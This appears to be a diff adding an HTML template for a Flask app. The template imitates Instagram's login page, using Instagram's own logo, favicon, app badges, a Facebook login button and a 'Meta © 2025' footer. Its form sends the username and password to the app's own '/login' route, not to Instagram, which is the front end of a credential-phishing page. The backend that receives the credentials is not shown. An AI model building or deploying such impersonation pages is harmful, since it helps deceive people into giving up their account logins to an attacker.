@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+</head>
+<body>
+    <div class="main-container">
+        <div class="login-box">
+            <img class="insta-logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
+
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="divider">OR</div>
+
+            <div class="fb-login">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/-XF4FQcre_i.png" alt="fb-icon" width="18">
+                <span>Log in with Facebook</span>
+            </div>
+
+            <div class="forgot">Forgot password?</div>
+        </div>
+
+        <div class="signup-box">
+            Don't have an account? <span>Sign up</span>
+        </div>
+
+        <div class="get-app-box">
+            <p>Get the app.</p>
+            <div class="store-links">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="App Store" />
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/5aff5412b6fb.png" alt="Google Play" />
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>Meta &copy; 2025</p>
+    </footer>
+</body>
+</html>
